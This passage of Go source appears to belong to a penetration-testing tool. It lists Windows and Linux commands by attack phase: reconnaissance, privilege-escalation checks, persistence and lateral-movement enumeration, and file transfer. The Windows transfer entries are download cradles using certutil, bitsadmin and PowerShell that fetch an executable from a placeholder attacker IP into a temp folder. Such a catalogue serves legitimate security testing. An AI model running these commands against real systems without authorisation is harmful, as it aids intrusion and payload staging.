				{"id": "netstat", "name": "网络连接", "cmd": "netstat -ano", "description": "查看网络连接和监听端口"},
				{"id": "tasklist", "name": "进程列表", "cmd": "tasklist /v", "description": "查看运行的进程"},
				{"id": "netuser", "name": "本地用户", "cmd": "net user", "description": "列出本地用户账户"},
				{"id": "netgroup", "name": "本地组", "cmd": "net localgroup administrators", "description": "查看管理员组成员"},
			},
			"privesc": {
				{"id": "whoami_priv", "name": "当前权限", "cmd": "whoami /priv", "description": "查看当前用户权限"},
				{"id": "schtasks", "name": "计划任务", "cmd": "schtasks /query /fo LIST /v", "description": "查看计划任务"},
				{"id": "services", "name": "服务列表", "cmd": "sc query state=all", "description": "查看所有服务"},
				{"id": "wmic_service", "name": "服务路径", "cmd": "wmic service get name,displayname,pathname,startmode", "description": "查看服务路径(查找未引用路径)"},
			},
			"persist": {
				{"id": "reg_run", "name": "启动项", "cmd": "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "description": "查看启动项"},
				{"id": "schtasks_list", "name": "计划任务", "cmd": "schtasks /query /fo TABLE", "description": "查看计划任务"},
			},
			"lateral": {
				{"id": "net_share", "name": "共享", "cmd": "net share", "description": "查看共享"},
				{"id": "net_view", "name": "网络邻居", "cmd": "net view", "description": "查看网络邻居"},
				{"id": "nltest", "name": "域信息", "cmd": "nltest /dclist:", "description": "查看域控列表"},
			},
			"transfer": {
				{"id": "certutil", "name": "CertUtil下载", "cmd": "certutil -urlcache -split -f http://IP/file.exe C:\\Windows\\Temp\\file.exe", "description": "使用 CertUtil 下载文件"},
				{"id": "bitsadmin", "name": "BitsAdmin下载", "cmd": "bitsadmin /transfer job /download /priority high http://IP/file.exe C:\\Windows\\Temp\\file.exe", "description": "使用 BitsAdmin 下载文件"},
				{"id": "powershell_iwr", "name": "PowerShell下载", "cmd": "powershell -c \"IWR -Uri http://IP/file.exe -OutFile C:\\Windows\\Temp\\file.exe\"", "description": "使用 PowerShell 下载文件"},
			},
		},
		"linux": {
			"recon": {
				{"id": "id", "name": "当前用户", "cmd": "id", "description": "查看当前用户身份"},
				{"id": "uname", "name": "系统信息", "cmd": "uname -a", "description": "获取系统信息"},
				{"id": "hostname", "name": "主机名", "cmd": "hostname", "description": "获取主机名"},
				{"id": "ifconfig", "name": "网络配置", "cmd": "ip addr || ifconfig", "description": "查看网络接口"},
				{"id": "ps", "name": "进程列表", "cmd": "ps aux", "description": "查看运行进程"},
				{"id": "netstat", "name": "网络连接", "cmd": "netstat -tulnp || ss -tulnp", "description": "查看网络连接"},
			},
			"privesc": {
				{"id": "sudo_l", "name": "sudo权限", "cmd": "sudo -l", "description": "查看 sudo 权限"},
				{"id": "suid", "name": "SUID文件", "cmd": "find / -perm -4000 2>/dev/null", "description": "查找 SUID 文件"},
				{"id": "cron", "name": "定时任务", "cmd": "cat /etc/crontab; ls -la /etc/cron.*", "description": "查看定时任务"},
			},
			"persist": {
				{"id": "crontab", "name": "用户定时任务", "cmd": "crontab -l", "description": "查看当前用户定时任务"},
				{"id": "bashrc", "name": "bashrc", "cmd": "cat ~/.bashrc", "description": "查看 bashrc"},
			},
			"lateral": {
				{"id": "ssh_keys", "name": "SSH密钥", "cmd": "cat ~/.ssh/known_hosts; ls -la ~/.ssh/", "description": "查看 SSH 密钥和已知主机"},
				{"id": "hosts", "name": "hosts文件", "cmd": "cat /etc/hosts", "description": "查看 hosts 文件"},
			},
		},
	}

	if osCommands, ok := commands[osType]; ok {
		if phaseCommands, ok := osCommands[phaseID]; ok {
			return phaseCommands
		}
	}
	return []map[string]interface{}{}
}
